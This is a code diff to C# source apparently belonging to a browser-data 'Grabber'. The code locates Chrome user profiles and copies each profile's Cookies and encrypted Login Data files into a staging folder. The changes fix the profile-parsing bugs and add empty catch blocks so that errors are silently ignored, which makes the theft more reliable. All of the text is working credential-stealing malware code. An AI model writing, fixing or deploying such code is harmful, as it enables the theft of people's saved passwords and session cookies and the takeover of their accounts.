@@ -58,14 +58,14 @@ namespace Grabber
                 string chromePath = home + @"\AppData\Local\Google\Chrome\User Data\";
 
                 List<string> list = new List<string>();
-                System.IO.StreamReader file = new StreamReader(chromePath + @"\Local State");
+                System.IO.StreamReader file = new StreamReader(chromePath + @"Local State");
 
                 int currentNumberOfProfiles = 0;
                 string line;
                 bool foundProfile = false;
                 while ((line = file.ReadLine()) != null)
                 {
-                    if (line.Contains(@"Profile "))
+                    if (line.Contains(@"""Profile "))
                     {
 
                         string[] values = line.Split('"');
@@ -87,11 +87,18 @@ namespace Grabber
                     Directory.CreateDirectory(cd + "\\Chrome\\" + list[1]);
 
                     //cookies
-                    File.Copy(home + @"\AppData\Local\Google\Chrome\User Data\" + list[0] + "\\Cookies", cd + "\\Chrome\\" + list[1] + "\\Cookies", true);
+                    try
+                    {
+                        File.Copy(home + @"\AppData\Local\Google\Chrome\User Data\" + list[0] + "\\Cookies", cd + "\\Chrome\\" + list[1] + "\\Cookies", true);
+                    }
+                    catch { };
 
                     //encrypted login data
-                    File.Copy(home + @"\AppData\Local\Google\Chrome\User Data\" + list[0] + "\\Login Data", cd + "\\Chrome\\" + list[1] + "\\Login Data", true);
-
+                    try
+                    {
+                        File.Copy(home + @"\AppData\Local\Google\Chrome\User Data\" + list[0] + "\\Login Data", cd + "\\Chrome\\" + list[1] + "\\Login Data", true);
+                    }
+                    catch { };
 
                     list.RemoveAt(0);
                     list.RemoveAt(0);
